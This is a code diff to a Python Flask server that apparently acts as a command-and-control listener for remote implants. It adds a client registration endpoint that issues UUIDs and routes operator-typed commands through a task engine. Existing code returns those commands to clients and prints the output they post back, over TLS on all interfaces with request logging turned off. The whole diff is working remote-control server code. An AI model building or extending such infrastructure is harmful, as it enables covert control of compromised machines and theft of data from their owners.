@@ -1,5 +1,8 @@
+import sys
+import time
 import logging
-from rich import print
+from uuid import uuid4
+from threading import Thread
 from prompt_toolkit import prompt
 from prompt_toolkit.styles import Style
 from flask import (
@@ -10,8 +13,15 @@ from flask import (
     redirect,
     Blueprint
 )
+
+from util.Banner import Banner
+from util.Loading import Loading
+from Tasks import Task_Engine
+
+loading = Loading()
 log = logging.getLogger('werkzeug')
 log.disabled = True
+
 app = Flask(__name__)
 errors = Blueprint('errors', __name__)
 emptyresponse = ('', 204)
@@ -36,6 +46,14 @@ def error_404(e):
 def internal_server_error(e):
     return redirect(url_for('Send'))
 
+@app.route("/register", methods=["GET"])
+def Accept():
+    return jsonify(
+        {
+            'UUID': str(uuid4())
+        }
+    )
+
 @app.route("/recv", methods=["GET"])
 def Send():
     try:
@@ -51,20 +69,22 @@ def Send():
             style=prompt_style
         )
     except KeyboardInterrupt:
-        command = 'close'
+        command = "close"
     
-    if command == "close":
-        print('[bold blue][*][/] Ended session')
-    return jsonify(
-        {
-            'Cmd': command
-        }
-    )
+    return jsonify(Task_Engine(command))
 
 @app.route("/send", methods=["POST"])
 def Recv():
     print(request.get_json()["Data"])
     return ('', 200)
 
-app.run("0.0.0.0", 8000, debug=False, ssl_context=("Certs/server.crt", "Certs/server.key"))
-        
+@app.before_first_request
+def Stop_loading():
+    loading.stop = True
+    sys.stdout.write("\033[F")
+    sys.stdout.write("\033[K")
+    time.sleep(.2)
+
+Banner()
+loading.start()
+app.run("0.0.0.0", 8000, debug=False, ssl_context=("Certs/server.crt", "Certs/server.key"))        
